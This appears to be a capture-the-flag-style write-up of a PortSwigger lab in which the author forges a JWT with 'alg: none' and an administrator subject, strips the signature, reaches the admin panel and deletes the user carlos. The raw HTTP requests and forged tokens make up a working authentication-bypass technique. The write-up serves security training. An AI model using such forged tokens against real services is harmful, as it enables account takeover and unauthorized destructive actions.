# JWT authentication bypass via flawed signature verification

This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.

To solve the lab, modify your session token to gain access to the admin panel at `/admin`, then delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`.

---

## 1. Detection

- Logged in with the given credentials (`wiener:peter`).
- Accessed `/my-account` with the session cookie issued at login:

```http
GET /my-account HTTP/2
Host: 0a1c007e0427fe5e80c60de000cf0023.web-security-academy.net
Cookie: session=eyJraWQiOiIxMTIwZDAyZS0xMzUzLTQ0ZTAtYjM4Ni0xNWE3NjkxZjY4YjkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MjcxNzY2MCwic3ViIjoid2llbmVyIn0.V05kKU39tsSTreitnjQmsIraGkEyKf26KC0bZpXNJDRb0XhL-9fRsn2AhiNfulhgauNBpprnHqw0PDStPIX3INyo8AY529Ozjb9-DdtpsSjSPsrIKpahNsqt8_mS6UqoWZsd080Yso_5Fl6r_AZ3A9kMnJxtImcpnhZPBAaWjrTMPFJSQHHMLHRm_yRvSCgZe_hXbV-ovzT4se-uqoPd1zmAQKy4YEUjgOijVunL_sCLfgslt3TbHimvmiNC5mr2UHuGmOCYRNQ1t_xf5eHErfZt8N-I2WN2FCmlFYtu_ZJRP4UEbfR1HUl4EG375jNvNxvDCjAzsEGJnstz6OyaNw
Cache-Control: max-age=0
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0a1c007e0427fe5e80c60de000cf0023.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
```

- Got back the normal account page for `wiener`:

```html
<div theme="">
    <section class="maincontainer">
        <div class="container is-page">
            <header class="navigation-header">
                <section class="top-links">
                    <a href=/>Home</a><p>|</p>
                    <a href="/my-account?id=wiener">My account</a><p>|</p>
                    <a href="/logout">Log out</a><p>|</p>
                </section>
            </header>
            <header class="notification-header">
            </header>
            <h1>My Account</h1>
            <div id=account-content>
                <p>Your username is: wiener</p>
                <p>Your email is: <span id="user-email">wiener@normal-user.net</span></p>
                <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                    <label>Email</label>
                    <input required type="email" name="email" value="">
                    <input required type="hidden" name="csrf" value="6dfZGYNw3SXsY28AxxUBBRh1Ed0qDnxK">
                    <button class='button' type='submit'> Update email </button>
                </form>
            </div>
        </div>
    </section>
```

---

## 2. Exploiting the Flawed Signature Verification

- Given the lab description states the server insecurely accepts unsigned JWTs, tried the same approach as a prior `alg: none` lab: changed the JWT header's `alg` from `RS256` to `none`, changed the payload's `sub` claim from `wiener` to `administrator`, and stripped the signature segment entirely.
- Sent the modified token to `/my-account`:

```http
GET /my-account HTTP/2
Host: 0a1c007e0427fe5e80c60de000cf0023.web-security-academy.net
Cookie: session=eyJraWQiOiIxMTIwZDAyZS0xMzUzLTQ0ZTAtYjM4Ni0xNWE3NjkxZjY4YjkiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MjcxNzY2MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
```

- The server accepted this forged token immediately and treated the session as `administrator`:

```html
<section class="maincontainer">
    <div class="container is-page">
        <header class="navigation-header">
            <section class="top-links">
                <a href=/>Home</a><p>|</p>
                <a href="/admin">Admin panel</a><p>|</p>
                <a href="/my-account?id=administrator">My account</a><p>|</p>
            </section>
        </header>
        <header class="notification-header">
        </header>
        <section>
            <h1>Users</h1>
            <div>
                <span>wiener - </span>
                <a href="/admin/delete?username=wiener">Delete</a>
            </div>
            <div>
                <span>carlos - </span>
                <a href="/admin/delete?username=carlos">Delete</a>
            </div>
        </section>
        <br>
        <hr>
    </div>
</section>
```

> **Why this works:** Despite the lab having a different title from a previous JWT lab ("flawed signature verification" vs. "unverified signature"), the actual exploitation technique is identical — setting `alg: none` and removing the signature segment causes the server to skip cryptographic verification entirely and trust the claims in the payload as-is. Whatever specific bug differs under the hood between the two labs, both ultimately fail to enforce that a JWT's signature is valid before trusting its `sub` claim, letting an attacker impersonate any user by simply editing the payload.

---

## 3. Solve the Challenge

- With the forged token authenticating as `administrator`, accessed `/admin` directly:

```http
GET /admin HTTP/2
Host: 0a1c007e0427fe5e80c60de000cf0023.web-security-academy.net
Cookie: session=eyJraWQiOiIxMTIwZDAyZS0xMzUzLTQ0ZTAtYjM4Ni0xNWE3NjkxZjY4YjkiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MjcxNzY2MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
```

- Got the admin user management panel, listing both `wiener` and `carlos` with delete links.
- Followed the delete link for `carlos`:

```
/admin/delete?username=carlos
```

- The response confirmed the deletion:

```html
<div theme="">
    <section class="maincontainer">
        <div class="container is-page">
            <header class="navigation-header">
                <section class="top-links">
                    <a href=/>Home</a><p>|</p>
                    <a href="/admin">Admin panel</a><p>|</p>
                    <a href="/my-account?id=administrator">My account</a><p>|</p>
                </section>
            </header>
            <header class="notification-header">
            </header>
            <section>
                <p>User deleted successfully!</p>
                <h1>Users</h1>
                <div>
                    <span>wiener - </span>
                    <a href="/admin/delete?username=wiener">Delete</a>
                </div>
            </section>
            <br>
            <hr>
        </div>
    </section>
```

- `carlos` no longer appears in the user list, and the lab banner shows `is-solved`.
- Lab solved.